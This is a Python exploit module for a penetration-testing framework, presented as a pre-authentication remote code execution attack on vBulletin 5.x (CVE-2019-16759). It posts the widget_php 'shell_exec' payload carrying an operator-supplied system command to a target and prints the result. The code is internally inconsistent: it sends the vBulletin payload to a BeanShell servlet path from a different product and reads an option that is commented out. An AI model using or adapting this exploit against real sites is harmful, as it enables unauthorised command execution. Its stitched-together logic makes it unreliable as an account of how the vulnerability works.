#!/usr/bin/python
# -*- coding:utf8 -*-
from zerooosploit.exploits import ExploitAggregate
from zerooosploit.color import *
import requests


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'vBulletin 5.x pre-auth RCE',
            'Module': 'exploits/vbulletin/cve-2019-16759',
            'Product': 'vBulletin',
            'Cve': 'cve-2019-16759',
            'Create_date': '2019-09-30',
            'Description': '\n',
            'Authors': '\n01sec',
            'References': '\n'
        }

        self.option = {
            'url': {'Current Setting': 'http://127.0.0.1:8080/', 'Required': 'yes', 'Description': 'The target url'},
            'command': {'Current Setting': 'whoami', 'Required': 'no', 'Description': 'Execute system commands'},
            # 'code': {'Current Setting': 'phpinfo()', 'Required': 'no', 'Description': 'Execute custom php code'}
        }

    def exploit(self):
        url = self.get_options('url')
        command = self.get_options('command')
        code = self.get_options('code')
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0)Gecko/20100101 Firefox/60.0'}
        payload = '''routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('{0}')'''.format(command)
        # payload1 = '''routestring=ajax/render/widget_php&widgetConfig[code]={0}'''.format(code)
        vul_url = url + '/weaver/bsh.servlet.BshServlet'
        print_blue('[*] {0}'.format(vul_url))
        try:
            r = requests.get(url=vul_url, headers=headers, timeout=60)
            if r.status_code == 404:
                print_blue('[*] Not found vul url')
            else:
                r1 = requests.post(url=vul_url, data=payload, headers=headers, timeout=60)
                if r1.status_code == 200:
                    print_green('[+] Exploit succeed')
                    print_green(r1.text)
                    print_blue('[*] Exploit completed')
                else:
                    print_blue('[*] Exploit completed')
        except requests.exceptions.Timeout:
            print_red('[-] {0} Error: Timeout'.format(url))
        except requests.exceptions.ConnectionError:
            print_red('[-] {0} Error: ConnectionError'.format(url))
